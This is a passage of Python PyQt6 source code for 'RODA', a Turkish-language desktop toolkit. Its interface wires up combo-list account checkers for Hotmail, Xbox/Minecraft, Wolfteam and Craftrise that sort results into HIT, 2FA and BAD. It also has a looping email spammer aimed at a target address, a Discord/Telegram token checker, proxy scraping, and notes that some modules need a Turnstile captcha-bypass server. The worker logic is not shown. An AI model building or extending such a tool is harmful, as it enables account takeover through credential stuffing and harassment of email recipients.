            self.log_list.clear(); self.counters = {k: 0 for k in self.statuses.keys()}; self.update_counters()
            
            if self.needs_combo: self.worker = self.worker_class(self.combos)
            else:
                l_mode = self.tiktok_len.currentText().split(": ")[1]
                t_count = self.tiktok_thread.currentText().split(": ")[1]
                self.worker = self.worker_class(l_mode, t_count)
                
            self.worker.log_signal.connect(self.add_log); self.worker.finished_signal.connect(self.on_finished); self.worker.start()
            self.btn_start.setText("Durdur"); self.apply_btn_style(self.btn_start, "#ef4444", "#dc2626")

    def on_finished(self): self.btn_start.setText("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3")

    def add_log(self, status, message):
        if status not in self.statuses: return
        self.counters[status] += 1; self.update_counters()
        color = self.statuses[status]; formatted_text = f"<font color='{color}'><b>[{status}]</b></font> {message}"
        item = QListWidgetItem(); item.setData(Qt.ItemDataRole.UserRole, status)
        lbl = QLabel(formatted_text); lbl.setStyleSheet("background: transparent; color: #e2e8f0; font-family: 'Consolas', monospace; font-size: 13px;")
        self.log_list.addItem(item); self.log_list.setItemWidget(item, lbl)
        if self.active_filter != "ALL" and self.active_filter != status: item.setHidden(True)
        else: self.log_list.scrollToBottom()

    def update_counters(self):
        for status, btn in self.stat_buttons.items(): btn.setText(f"{status}: {self.counters[status]}")

    def filter_results(self, status, checked):
        if not checked: self.show_all_results(); return
        self.active_filter = status
        for s, btn in self.stat_buttons.items():
            if s != status: btn.setChecked(False)
        for i in range(self.log_list.count()):
            item = self.log_list.item(i); item.setHidden(item.data(Qt.ItemDataRole.UserRole) != status)

    def show_all_results(self):
        self.active_filter = "ALL"
        for btn in self.stat_buttons.values(): btn.setChecked(False)
        for i in range(self.log_list.count()): self.log_list.item(i).setHidden(False)
        self.log_list.scrollToBottom()

# ==============================================================================
# RODA ENGINE (ANA UYGULAMA)
# ==============================================================================
class RodaEngine(QMainWindow):
    def __init__(self):
        super().__init__()
        self.network_manager = QNetworkAccessManager(self)
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.resize(1300, 800)
        self.setStyleSheet(RODA_STIL)
        self.drag_offset = QPoint()
        self.aktif_calisanlar = {}
        
        self.canvas = QWidget()
        self.canvas.setObjectName("CoreCanvas")
        self.setCentralWidget(self.canvas)
        self.canvas_layout = QVBoxLayout(self.canvas)
        self.canvas_layout.setContentsMargins(0, 0, 0, 0)
        self.master_stack = QStackedWidget()
        self.canvas_layout.addWidget(self.master_stack)
        
        self.build_boot_sequence()
        self.build_toolkit_dashboard()
        
        self.master_stack.setCurrentIndex(0)
        QTimer.singleShot(2500, self.transition_to_main)
        self.hw_timer = QTimer(self)
        self.hw_timer.timeout.connect(self.update_hardware)
        self.hw_timer.start(1500)

    def show_placeholder_logo(self, target_label, text):
        target_label.setText(text)
        target_label.setStyleSheet("color: rgba(188, 19, 254, 0.9); font-size: 16px; font-weight: 900; letter-spacing: 4px; padding-left: 5px;")

    def build_boot_sequence(self):
        self.boot_widget = QWidget()
        layout = QVBoxLayout(self.boot_widget)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.boot_bg = NeonSnowCanvas(self.boot_widget)
        self.boot_bg.setGeometry(0, 0, 1300, 800)
        self.boot_bg.lower()
        self.logo_label = QLabel()
        self.show_placeholder_logo(self.logo_label, "R O D A")
        self.logo_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.sync_status = QLabel("RODA SYSTEM INITIALIZED // SECURE CONNECTION LAUNCHED")
        self.sync_status.setStyleSheet("color: rgba(188, 19, 254, 0.8); font-family: 'Consolas', monospace; font-size: 12px; letter-spacing: 3px; margin-top: 25px;")
        self.sync_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.logo_label)
        layout.addWidget(self.sync_status)
        self.master_stack.addWidget(self.boot_widget)

    def transition_to_main(self):
        dash = self.master_stack.widget(1)
        opacity = QGraphicsOpacityEffect(dash)
        dash.setGraphicsEffect(opacity)
        self.master_stack.setCurrentIndex(1)
        self.trans_anim = QPropertyAnimation(opacity, b"opacity")
        self.trans_anim.setDuration(600)
        self.trans_anim.setStartValue(0.0)
        self.trans_anim.setEndValue(1.0)
        self.trans_anim.setEasingCurve(QEasingCurve.Type.OutQuad)
        self.trans_anim.start()
        QTimer.singleShot(800, lambda: RodaToastNotification("Sistem Devrede", "Tüm siber modüller başarıyla yüklendi.", self.canvas))

    def build_toolkit_dashboard(self):
        self.dash_page = QWidget()
        self.dash_bg = NeonSnowCanvas(self.dash_page)
        self.dash_bg.setGeometry(0, 0, 1300, 800)
        self.dash_bg.lower()
        main_dash_layout = QHBoxLayout(self.dash_page)
        main_dash_layout.setContentsMargins(0, 0, 0, 0)
        main_dash_layout.setSpacing(0)
        
        sidebar = QFrame()
        sidebar.setObjectName("SidebarFrame")
        sidebar.setFixedWidth(280)
        sidebar_main_layout = QVBoxLayout(sidebar)
        sidebar_main_layout.setContentsMargins(10, 30, 10, 15)
        
        brand_lbl = QLabel()
        brand_lbl.setObjectName("SidebarLogo")
        brand_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.show_placeholder_logo(brand_lbl, "RODA")
        sidebar_main_layout.addWidget(brand_lbl)
        sidebar_main_layout.addSpacing(15)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll_content = QWidget()
        self.sidebar_layout = QVBoxLayout(scroll_content)
        self.sidebar_layout.setContentsMargins(10, 0, 10, 0)
        self.sidebar_layout.setSpacing(8)
        self.menu_registry = []
        self.view_stack = QStackedWidget()
        
        modules = [
            ("Ana Sayfa", "dashboard", self.create_dashboard_view),
            ("Proxy Scrape & Check", "proxy", self.create_proxy_view),
            ("TikTok Gen & Check", "tiktok", self.create_tiktok_view),
            ("Xbox & MC Checker", "xbox", self.create_xbox_view),
            ("Wolfteam Checker", "wolfteam", self.create_wolfteam_view),
            ("Craftrise Checker", "craftrise", self.create_craftrise_view),
            ("Temp Mail", "mail", self.create_temp_mail_view),
            ("Email Spammer", "spam", self.create_spammer_view),
            ("Token Check", "token", self.create_token_view),
            ("Hotmail Checker", "checker", self.create_hotmail_view)
        ]
        
        for i, (name, icon, view_factory) in enumerate(modules):
            btn = NeonGlowButton(name, icon)
            btn.clicked.connect(lambda checked, idx=i: self.switch_view_node(idx))
            self.sidebar_layout.addWidget(btn)
            self.menu_registry.append(btn)
            self.view_stack.addWidget(view_factory())
            
        self.sidebar_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        sidebar_main_layout.addWidget(scroll_area)
        self.menu_registry[0].setChecked(True)
        main_dash_layout.addWidget(sidebar)
        
        right_container = QWidget()
        right_layout = QVBoxLayout(right_container)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(0)
        window_controls_layout = QHBoxLayout()
        window_controls_layout.setContentsMargins(0, 12, 16, 0)
        window_controls_layout.addStretch()
        min_btn = QPushButton("-")
        min_btn.setObjectName("WindowBtn")
        min_btn.setFixedSize(32, 28)
        min_btn.clicked.connect(self.showMinimized)
        close_btn = QPushButton("x")
        close_btn.setObjectName("CloseBtn")
        close_btn.setFixedSize(32, 28)
        close_btn.clicked.connect(self.close)
        window_controls_layout.addWidget(min_btn)
        window_controls_layout.addWidget(close_btn)
        right_layout.addLayout(window_controls_layout)
        right_layout.addWidget(self.view_stack)
        main_dash_layout.addWidget(right_container)
        self.master_stack.addWidget(self.dash_page)

    def switch_view_node(self, target_index):
        self.view_stack.setCurrentIndex(target_index)
        for i, btn in enumerate(self.menu_registry):
            btn.setChecked(i == target_index)

    def apply_btn_style(self, btn, base_color="#ff00ff", hover_color="#d946ef"):
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"QPushButton {{ background-color: {base_color}; color: #ffffff; font-weight: 700; font-size: 13px; border: none; border-radius: 10px; padding: 12px 24px; }} QPushButton:hover {{ background-color: {hover_color}; }}")

    # ========== GÖRÜNÜMLER ==========
    def create_dashboard_view(self):
        view = QWidget()
        layout = QVBoxLayout(view)
        layout.setContentsMargins(40, 20, 40, 40)
        lbl = QLabel("RODA - Sistem Veri & Analiz Paneli")
        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800; letter-spacing: 0.5px;")
        layout.addWidget(lbl)
        layout.addSpacing(25)
        grid = QGridLayout()
        grid.setSpacing(20)
        self.cpu_card = self.create_info_card("CPU Yük Endeksi", "%0", "cpu", "rgba(188, 19, 254, 0.9)")
        self.ram_card = self.create_info_card("RAM Bellek Hacmi", "%0", "ram", "#00f0ff")
        self.tools_card = self.create_info_card("Aktif Sistem Modülü", "10 Modül", "dashboard", "#a855f7")
        grid.addWidget(self.cpu_card[0], 0, 0)
        grid.addWidget(self.ram_card[0], 0, 1)
        grid.addWidget(self.tools_card[0], 1, 0, 1, 2)
        layout.addLayout(grid, stretch=1)
        return view

    def create_info_card(self, title, val, icon_mode, color):
        card = QFrame()
        card.setStyleSheet("background-color: rgba(12, 6, 24, 0.65); border: none; border-radius: 14px;")
        c_layout = QVBoxLayout(card)
        c_layout.setContentsMargins(25, 25, 25, 25)
        top_h = QHBoxLayout()
        icon = ToolkitVectorIcon(icon_mode)
        icon.set_active(True)
        top_h.addWidget(icon)
        t_lbl = QLabel(title)
        t_lbl.setStyleSheet("color: #94a3b8; font-size: 15px; font-weight: 700;")
        top_h.addWidget(t_lbl)
        top_h.addStretch()
        v_lbl = QLabel(val)
        v_lbl.setStyleSheet(f"color: {color}; font-size: 28px; font-weight: 800; margin-top: 10px;")
        c_layout.addLayout(top_h)
        c_layout.addWidget(v_lbl)
        c_layout.addStretch()
        return card, v_lbl

    def update_hardware(self):
        try:
            self.cpu_card[1].setText(f"% {psutil.cpu_percent()}")
            self.ram_card[1].setText(f"% {psutil.virtual_memory().percent}")
        except:
            pass

    def create_temp_mail_view(self):
        view = QWidget()
        layout = QVBoxLayout(view)
        layout.setContentsMargins(40, 20, 40, 40)
        lbl = QLabel("Geçici E-Posta İstasyonu")
        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
        layout.addWidget(lbl)
        layout.addSpacing(15)
        top_h = QHBoxLayout()
        self.mail_input = QLineEdit()
        self.mail_input.setReadOnly(True)
        self.mail_input.setText("Adres Üretilmedi")
        btn_copy = QPushButton("Kopyala")
        self.apply_btn_style(btn_copy, "#3b82f6", "#2563eb")
        btn_copy.clicked.connect(self.tm_copy)
        btn_gen = QPushButton("Adres Üret")
        self.apply_btn_style(btn_gen, "#bc13fe", "#a811e3")
        btn_gen.clicked.connect(self.tm_generate)
        top_h.addWidget(self.mail_input, stretch=1)
        top_h.addWidget(btn_copy)
        top_h.addWidget(btn_gen)
        layout.addLayout(top_h)
        
        self.tm_stack = QStackedWidget()
        page_list = QWidget()
        lay_list = QVBoxLayout(page_list)
        lay_list.setContentsMargins(0, 10, 0, 0)
        btn_ref = QPushButton("Gelen Kutusunu Yenile")
        self.apply_btn_style(btn_ref, "#10b981", "#059669")
        btn_ref.clicked.connect(self.tm_refresh)
        self.inbox_list = QListWidget()
        self.inbox_list.itemClicked.connect(self.tm_read_mail)
        lay_list.addWidget(btn_ref)
        lay_list.addWidget(self.inbox_list)
        self.tm_stack.addWidget(page_list)
        
        page_read = QWidget()
        lay_read = QVBoxLayout(page_read)
        lay_read.setContentsMargins(0, 10, 0, 0)
        btn_back = QPushButton("Listeye Geri Dön")
        self.apply_btn_style(btn_back, "#64748b", "#475569")
        btn_back.clicked.connect(lambda: self.tm_stack.setCurrentIndex(0))
        self.mail_content = QTextBrowser()
        self.mail_content.setOpenExternalLinks(True)
        lay_read.addWidget(btn_back)
        lay_read.addWidget(self.mail_content)
        self.tm_stack.addWidget(page_read)
        layout.addWidget(self.tm_stack, stretch=1)
        self.temp_mail = ""
        self.temp_token = ""
        return view

    def tm_generate(self):
        self.mail_input.setText("Üretiliyor...")
        self.gen_w = MailTmGenerateWorker()
        self.gen_w.success_signal.connect(self.tm_gen_ok)
        self.gen_w.start()

    def tm_gen_ok(self, email, pwd, token):
        self.temp_mail = email
        self.temp_token = token
        self.mail_input.setText(email)
        self.inbox_list.clear()
        RodaToastNotification("Sistem", "Yeni E-Posta oluşturuldu.", self.canvas)

    def tm_copy(self):
        if self.temp_mail:
            QApplication.clipboard().setText(self.temp_mail)
            RodaToastNotification("Pano", "E-Posta kopyalandı.", self.canvas)

    def tm_refresh(self):
        if not self.temp_token:
            return
        self.inbox_list.clear()
        self.inbox_list.addItem("Taranıyor...")
        self.ref_w = MailTmRefreshWorker(self.temp_token)
        self.ref_w.success_signal.connect(self.tm_ref_ok)
        self.ref_w.start()

    def tm_ref_ok(self, msgs):
        self.inbox_list.clear()
        if not msgs:
            self.inbox_list.addItem("Kutu boş.")
            return
        for msg in msgs:
            item = QListWidgetItem(f"Gönderen: {msg.get('from', {}).get('address', '')} | Konu: {msg.get('subject', '')}")
            item.setData(Qt.ItemDataRole.UserRole, msg.get("id"))
            self.inbox_list.addItem(item)

    def tm_read_mail(self, item):
        msg_id = item.data(Qt.ItemDataRole.UserRole)
        if not msg_id:
            return
        self.mail_content.setText("İçerik yükleniyor...")
        self.tm_stack.setCurrentIndex(1)
        self.rd_w = MailTmReadWorker(self.temp_token, msg_id)
        self.rd_w.success_signal.connect(self.tm_read_ok)
        self.rd_w.start()

    def tm_read_ok(self, msg):
        raw_text = msg.get('text', '')
        html_text = re.sub(r'(https?://\S+)', r'<a href="\1" style="color: #bc13fe;">\1</a>', raw_text.replace('\n', '<br>'))
        formatted_html = f"<b>Kimden:</b> {msg.get('from', {}).get('address', '')}<br><b>Konu:</b> {msg.get('subject')}<br><br><b>İçerik:</b><br>{html_text}"
        self.mail_content.setHtml(formatted_html)

    def create_spammer_view(self):
        view = QWidget()
        layout = QVBoxLayout(view)
        layout.setContentsMargins(40, 20, 40, 40)
        lbl = QLabel("Email Paket Gönderimi")
        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
        layout.addWidget(lbl)
        layout.addSpacing(20)
        top_h = QHBoxLayout()
        self.spam_input = QLineEdit()
        self.spam_input.setPlaceholderText("Hedef e-posta adresini girin...")
        self.spam_speed = QComboBox()
        self.spam_speed.addItems(["Hız Modu: Yavas (5 sn)", "Hız Modu: Hizli (1 sn)"])
        top_h.addWidget(self.spam_input, stretch=1)
        top_h.addWidget(self.spam_speed)
        layout.addLayout(top_h)
        self.btn_spam = QPushButton("Döngüyü Başlat")
        self.apply_btn_style(self.btn_spam, "#ef4444", "#dc2626")
        self.btn_spam.clicked.connect(self.toggle_spam)
        layout.addWidget(self.btn_spam)
        self.spam_log = QTextEdit()
        self.spam_log.setReadOnly(True)
        layout.addWidget(self.spam_log, stretch=1)
        return view

    def toggle_spam(self):
        if "spam" in self.aktif_calisanlar:
            self.aktif_calisanlar["spam"].stop()
            del self.aktif_calisanlar["spam"]
            self.btn_spam.setText("Döngüyü Başlat")
            self.apply_btn_style(self.btn_spam, "#ef4444", "#dc2626")
        else:
            if not self.spam_input.text().strip():
                return
            w = EmailSpamWorker(self.spam_input.text().strip(), self.spam_speed.currentText())
            w.log_signal.connect(self.spam_log.append)
            self.aktif_calisanlar["spam"] = w
            w.start()
            self.btn_spam.setText("Döngüyü Kapat")
            self.apply_btn_style(self.btn_spam, "#64748b", "#475569")

    def create_token_view(self):
        view = QWidget()
        layout = QVBoxLayout(view)
        layout.setContentsMargins(40, 20, 40, 40)
        lbl = QLabel("Siber Token Denetimi")
        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
        layout.addWidget(lbl)
        layout.addSpacing(20)
        sel_layout = QHBoxLayout()
        self.t_type = "discord"
        self.btn_dc = QPushButton("Discord")
        self.btn_tg = QPushButton("Telegram")
        self.token_input = QLineEdit()
        def update_token_ui(t):
            self.t_type = t
            if t == "discord":
                self.apply_btn_style(self.btn_dc, "#5865F2", "#4752C4")
                self.apply_btn_style(self.btn_tg, "#64748b", "#475569")
            else:
                self.apply_btn_style(self.btn_dc, "#64748b", "#475569")
                self.apply_btn_style(self.btn_tg, "#0088cc", "#0077b5")
            self.token_input.setPlaceholderText(f"{t.capitalize()} Token Girin...")
        self.btn_dc.clicked.connect(lambda: update_token_ui("discord"))
        self.btn_tg.clicked.connect(lambda: update_token_ui("telegram"))
        update_token_ui("discord")
        sel_layout.addWidget(self.btn_dc)
        sel_layout.addWidget(self.btn_tg)
        layout.addLayout(sel_layout)
        layout.addWidget(self.token_input)
        btn_chk = QPushButton("Tokeni Doğrula")
        self.apply_btn_style(btn_chk, "#bc13fe", "#a811e3")
        btn_chk.clicked.connect(self.check_token_action)
        layout.addWidget(btn_chk)
        self.token_log = QTextEdit()
        self.token_log.setReadOnly(True)
        layout.addWidget(self.token_log, stretch=1)
        return view

    def check_token_action(self):
        t = self.token_input.text().strip()
        if not t:
            return
        self.token_log.append(f"\nSorgulanıyor [{self.t_type.upper()}]...")
        self.checker_w = TokenCheckWorker(self.t_type, t)
        self.checker_w.result_signal.connect(lambda s, m: self.token_log.append(f"-> Sonuç:\n{m}"))
        self.checker_w.start()

    def create_proxy_view(self):
        view = QWidget()
        layout = QVBoxLayout(view)
        layout.setContentsMargins(40, 20, 40, 40)
        lbl = QLabel("Proxy Kazıma & Denetleme")
        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
        layout.addWidget(lbl)
        
        ctrl = QHBoxLayout()
        self.p_limit = QComboBox()
        self.p_limit.addItems([f"Hedef Çalışan Limit: {i}" for i in [5, 10, 15, 50]])
        self.p_proto = QComboBox()
        self.p_proto.addItems(["Protokol: http", "Protokol: socks4", "Protokol: socks5", "Protokol: all"])
        self.p_country = QComboBox()
        self.p_country.addItems(["Ülke: TR", "Ülke: US", "Ülke: DE", "Ülke: GB", "Ülke: FR"])
        
        for c in [self.p_limit, self.p_proto, self.p_country]:
            ctrl.addWidget(c)
        
        self.p_btn = QPushButton("Scrape & Check Başlat")
        self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")
        self.p_btn.clicked.connect(self.start_proxy)
        ctrl.addWidget(self.p_btn)
        layout.addLayout(ctrl)
        
        self.p_prog = QLabel("Bekliyor...")
        self.p_prog.setStyleSheet("color: #10b981; font-weight: bold;")
        layout.addWidget(self.p_prog)
        
        self.p_log = QListWidget()
        layout.addWidget(self.p_log, stretch=1)
        self.p_worker = None
        return view

    def start_proxy(self):
        if self.p_worker and self.p_worker.isRunning():
            self.p_worker.stop()
            self.p_btn.setText("Başlat")
            self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")
        else:
            self.p_log.clear()
            limit = int(self.p_limit.currentText().split(": ")[1])
            proto = self.p_proto.currentText().split(": ")[1]
            country = self.p_country.currentText().split(": ")[1]
            self.p_worker = ProxyWorker(limit, country, proto)
            self.p_worker.log_signal.connect(lambda s, m: self.p_log.addItem(f"[{s}] {m}"))
            self.p_worker.progress_signal.connect(lambda c, w, t: self.p_prog.setText(f"Taranan: {c} | Çalışan: {w} / Hedef: {t}"))
            self.p_worker.finished_signal.connect(lambda: [self.p_btn.setText("Başlat"), self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")])
            self.p_worker.start()
            self.p_btn.setText("Durdur")
            self.apply_btn_style(self.p_btn, "#ef4444", "#dc2626")

    def create_tiktok_view(self):
        desc = ("Bu araç rastgele TikTok kullanıcı adları üretir.\n"
                "NOT: TikTok Cloudflare koruması uyguladığından %100 doğruluk veremez.")
        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
        return UniversalCheckerWidget("TikTok Oto-Oluşturucu", desc, TiktokWorker, statuses, needs_combo=False)

    def create_xbox_view(self):
        desc = "Xbox / Minecraft (Gamepass) yetkilerini denetler. Güvenli API kullanır."
        statuses = {"HİT": "#10b981", "2FA": "#eab308", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
        return UniversalCheckerWidget("Xbox & MC Checker", desc, XboxWorker, statuses, needs_combo=True)

    def create_wolfteam_view(self):
        desc = "Joygame / Wolfteam hesaplarını tarar. Arkaplanda Flask Turnstile Sunucusunun çalışması GEREKLİDİR."
        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
        return UniversalCheckerWidget("Wolfteam Checker", desc, WolfteamWorker, statuses, needs_combo=True)

    def create_craftrise_view(self):
        desc = "Craftrise rank ve RC bakiyesi tarar. Arkaplanda Flask Turnstile Sunucusunun çalışması GEREKLİDİR."
        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
        return UniversalCheckerWidget("Craftrise Checker", desc, CraftriseWorker, statuses, needs_combo=True)

    def create_hotmail_view(self):
        desc = "Outlook/Hotmail hesaplarını güvenli MS Server üzerinden test eder. 2FA'ya düşenleri ayırır."
        statuses = {"HİT": "#10b981", "2FA": "#eab308", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
        return UniversalCheckerWidget("Hotmail Checker", desc, HotmailWorker, statuses, needs_combo=True)

    # ========== PENCERE SÜRÜKLEME ==========
    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.drag_offset = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
            event.accept()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.MouseButton.LeftButton:
            self.move(event.globalPosition().toPoint() - self.drag_offset)
            event.accept()

if __name__ == "__main__":
    QApplication.setHighDpiScaleFactorRoundingPolicy(Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    engine = RodaEngine()
    engine.show()
    sys.exit(app.exec())
